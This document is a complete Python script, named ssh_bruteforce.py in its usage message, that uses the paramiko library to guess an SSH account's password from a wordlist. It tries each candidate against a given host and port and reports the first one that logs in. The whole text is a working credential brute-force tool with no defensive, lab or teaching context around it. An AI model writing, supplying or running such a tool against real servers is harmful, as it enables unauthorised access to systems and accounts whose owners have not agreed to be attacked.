import paramiko
import sys

def ssh_connect(hostname, port, username, password):
    try:
        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        client.connect(hostname, port=port, username=username, password=password)
        print(f"[*] Password found: {password}")
        return True
    except paramiko.AuthenticationException:
        print(f"[-] Failed password: {password}")
        return False
    except Exception as e:
        print(f"[-] Exception: {e}")
        return False
    finally:
        client.close()

def main():
    if len(sys.argv) != 5:
        print("Usage: python ssh_bruteforce.py <hostname> <port> <username> <wordlist>")
        sys.exit(1)

    hostname = sys.argv[1]
    port = int(sys.argv[2])
    username = sys.argv[3]
    wordlist_path = sys.argv[4]

    with open(wordlist_path, "r") as f:
        for line in f:
            password = line.strip()
            if ssh_connect(hostname, port, username, password):
                print("[+] SSH login successful!")
                break

if __name__ == "__main__":
    main()
